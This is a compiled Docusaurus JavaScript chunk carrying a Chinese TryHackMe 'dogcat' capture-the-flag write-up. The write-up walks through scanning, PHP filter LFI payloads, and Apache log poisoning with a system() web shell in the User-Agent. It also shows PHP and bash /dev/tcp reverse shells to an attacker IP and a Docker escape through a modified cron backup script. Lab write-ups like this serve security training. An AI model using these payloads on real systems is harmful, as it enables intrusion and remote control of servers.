"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4347],{18213:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>o,toc:()=>d});var a=t(74848),r=t(28453);const s={sidebar_position:84,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","SUID"],title:"dogcat",description:"dogcat",sidebar_label:"dogcat",slug:"/tryhackme/84"},i="dogcat",o={id:"box/TryHackMe/84",title:"dogcat",description:"dogcat",source:"@site/docs/box/TryHackMe/84.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/84",permalink:"/docs/tryhackme/84",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:84,frontMatter:{sidebar_position:84,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","SUID"],title:"dogcat",description:"dogcat",sidebar_label:"dogcat",slug:"/tryhackme/84"},sidebar:"boxSidebar",previous:{title:"Anonymous",permalink:"/docs/tryhackme/83"},next:{title:"Boiler CTF",permalink:"/docs/tryhackme/85"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root(docker)",id:"www-data--rootdocker",level:3},{value:"root(docker) \u2014&gt; root(\u7269\u7406\u673a\u5668)",id:"rootdocker--root\u7269\u7406\u673a\u5668",level:3}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"dogcat",children:"dogcat"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-168-22:~/dogcat# nmap -sTCV -p 22,80 --min-rate 1000 10.10.68.174\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-11 09:14 BST\nNmap scan report for ip-10-10-68-174.eu-west-1.compute.internal (10.10.68.174)\nHost is up (0.00013s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: dogcat\nMAC Address: 02:F9:D2:6A:B2:F9 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n"})}),"\n",(0,a.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-168-22:~/dogcat# gobuster dir -u http://10.10.68.174/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.68.174/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/11 09:16:49 Starting gobuster\n===============================================================\n/index.php (Status: 200)\n/cat.php (Status: 200)\n/flag.php (Status: 200)\n/cats (Status: 301)\n/dogs (Status: 301)\n/dog.php (Status: 200)\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u8bbf\u95ee\u65f6\u6211\u53d1\u73b0 URL \u5b58\u5728\u4e00\u4e9b\u4e0d\u5bf9"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205118.png",alt:"20240703205118"})}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u611f\u89c9\u8fd9\u91cc\u662f\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e, \u6240\u4ee5\u6211\u5f00\u59cb\u4e86\u6d4b\u8bd5, \u5f53\u6211\u6d4b\u8bd5\u7684\u65f6\u5019, \u663e\u793a\u53ea\u5141\u8bb8 dog \u548c cat , \u8bf4\u660e\u540e\u7aef\u9700\u8981\u6821\u9a8c\u8fd9\u4e2a\u5185\u5bb9, \u6700\u540e\u6784\u9020\u7684 payload \u4e3a:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"http://10.10.162.26/?view=php://filter/convert.base64-encode/resource=dog/../index\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u56e0\u6b64\u8bfb\u53d6\u5230\u4e86 index.php \u5185\u5bb9\u5f00\u59cb\u4ee3\u7801\u5ba1\u8ba1:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"<?php\n      function containsStr($str, $substr) {\n          return strpos($str, $substr) !== false;\n      }\n$ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\n      if(isset($_GET['view'])) {\n          if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\n              echo 'Here you go!';\n              include $_GET['view'] . $ext;\n          } else {\n              echo 'Sorry, only dogs or cats are allowed.';\n          }\n      }\n  ?>\n"})}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"\u6587\u4ef6\u540e\u7f00\u662f\u7531 ext \u53c2\u6570\u786e\u5b9a\u7684"}),"\n",(0,a.jsx)(n.li,{children:"\u660e\u786e\u8981\u6c42\u5b58\u5728 dog \u548c cat"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u56e0\u6b64\u6784\u9020\u4e86\u7b2c\u4e8c\u6b65\u7684 payload"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"http://10.10.162.26/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u63a5\u7740\u5c31\u9700\u8981\u8003\u8651\u83b7\u53d6 Shell \u4e86, \u5728\u8fd9\u4e00\u6b65\u6211\u60f3\u4e86\u5f88\u4e45\u624d\u60f3\u8d77\u65e5\u5fd7\u6587\u4ef6\u5305\u542b, \u56e0\u4e3a\u4e4b\u524d\u505a\u8fc7\u76ee\u5f55\u904d\u5386\u6240\u4ee5\u9700\u8981\u91cd\u65b0\u5f00\u542f\u673a\u5668, \u53d1\u9001\u5982\u4e0b\u5185\u5bb9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"GET /?view=dog/../../../../var/log/apache2/access.log&ext HTTP/1.1\nHost: 10.10.162.26\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: <?php system($_GET['c']); ?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6\nConnection: close\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u4e86"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205134.png",alt:"20240703205134"})}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:'php -r \'$sock=fsockopen("10.10.168.22",4445);exec("/bin/bash <&3 >&3 2>&3");\'\n'})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205153.png",alt:"20240703205153"})}),"\n",(0,a.jsx)(n.h3,{id:"www-data--rootdocker",children:"www-data \u2014> root(docker)"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205209.png",alt:"20240703205209"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u627e SUID \u6587\u4ef6\u6211\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u7a0b\u5e8f ",(0,a.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/env/#suid",children:"env#suid"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205232.png",alt:"20240703205232"})}),"\n",(0,a.jsx)(n.h3,{id:"rootdocker--root\u7269\u7406\u673a\u5668",children:"root(docker) \u2014> root(\u7269\u7406\u673a\u5668)"}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u627e\u6700\u8fd1\u4e94\u5206\u949f\u4fee\u6539\u7684\u6587\u4ef6\u6211\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205247.png",alt:"20240703205247"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"ls -al\ntotal 2892\ndrwxr-xr-x 2 root root    4096 Apr  8  2020 .\ndrwxr-xr-x 1 root root    4096 Sep 11 08:52 ..\n-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh\n-rw-r--r-- 1 root root 2949120 Sep 11 09:16 backup.tar\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b ",(0,a.jsx)(n.code,{children:"backup.sh"})," \u7684\u5185\u5bb9\u6211\u610f\u8bc6\u5230\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u6240\u4ee5\u6211\u4fbf\u4fee\u6539\u4e86\u8fd9\u4e2a\u6587\u4ef6\u5e76\u5f00\u542f\u76d1\u542c"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"bash -c '/bin/bash -i >& /dev/tcp/10.10.168.22/4445 0>&1'\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703205310.png",alt:"20240703205310"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var a=t(96540);const r={},s=a.createContext(r);function i(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);